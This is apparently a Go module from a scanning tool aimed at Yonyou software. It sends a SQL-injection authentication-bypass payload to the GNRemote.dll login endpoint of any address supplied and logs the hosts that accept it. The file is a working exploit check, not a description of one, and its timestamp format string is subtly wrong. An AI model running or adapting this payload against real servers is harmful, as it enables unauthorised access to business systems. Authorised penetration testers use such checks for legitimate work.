package Scan

import (
	"fmt"
	"fupo_for_yonyou/Utils"
	"io/ioutil"
	"net/http"
	"strings"
	"time"
)

func GNRemoteScan(address string, client *http.Client, Red string, Green string, Yellow string, Reset string, Cyan string, currentTime string) {
	GNRemote := "用友 畅捷通远程通 GNRemote.dll SQL注入漏洞"
	urls := address + "/GNRemote.dll?GNFunction=LoginServer&decorator=text_wrap&frombrowser=esl"
	response, err := client.Post(urls, "application/x-www-form-urlencoded", strings.NewReader("username=%22'%20or%201%3d1%3b%22&password=%018d8cbc8bfc24f018&ClientStatus=1"))
	if err != nil {
		if strings.Contains(err.Error(), "An existing connection was forcibly closed by the remote host") || strings.Contains(err.Error(), "forcibly closed") {
			fmt.Printf("[%s%s%s] [%s-%s] %s 扫描时连接被目标服务器阻断\n", Cyan, currentTime, Reset, Yellow, Reset, GNRemote)
		} else {
			fmt.Printf("[%s%s%s] [%s-%s] %s 扫描时连接被重置\n", Cyan, currentTime, Reset, Yellow, Reset, GNRemote)
		}
		return
	}
	defer response.Body.Close()

	// 读取响应内容
	body, err := ioutil.ReadAll(response.Body)
	if err != nil {
		output := fmt.Sprintf("[%s%s%s] [%s-%s] %s 读取响应内容失败: %v", Cyan, currentTime, Reset, Yellow, Reset, GNRemote, err)
		fmt.Println(output)
		return
	}

	if strings.Contains(string(body), "{\"RetCode\":0}") {
		result := GNRemote + "：" + urls
		//保存文件不能用传来的currentTime，得重新定义一个格式的时间戳
		timestamp := time.Now().Format("20230712")
		filename := fmt.Sprintf("scan_result_%s.txt", timestamp)
		err := Utils.SaveResultToFile(result, filename)
		if err != nil {
			output := fmt.Sprintf("[%s%s%s] [%s-%s] 保存结果到文件出错: %v", Cyan, currentTime, Reset, Yellow, Reset, err)
			fmt.Println(output)
		}
		output := fmt.Sprintf("[%s%s%s] [%s+%s] 存在%s：%s", Cyan, currentTime, Reset, Green, Reset, GNRemote, urls)
		fmt.Println(output)
	} else {
		output := fmt.Sprintf("[%s%s%s] [%s-%s] 不存在%s 响应码: %d", Cyan, currentTime, Reset, Yellow, Reset, GNRemote, response.StatusCode)
		fmt.Println(output)
	}
}
